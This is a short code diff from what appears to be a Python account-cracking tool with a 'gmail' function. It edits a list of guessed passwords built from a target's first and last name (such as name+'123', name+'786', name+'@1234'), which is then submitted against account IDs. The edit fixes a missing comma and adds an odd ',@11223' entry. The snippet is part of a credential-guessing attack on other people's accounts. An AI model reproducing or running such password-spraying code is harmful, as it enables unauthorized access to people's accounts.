@@ -559,7 +559,7 @@ def gmail():
                                         last_name = 'Khan'
                                 fs = first_name.lower()
                                 ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs+'@123',fs+'@1234',fs+'@12345' fs+'@11223']
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs+'@123',fs+'@1234',fs+'@12345',fs+',@11223']
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')             
                 print(' The process has completed')
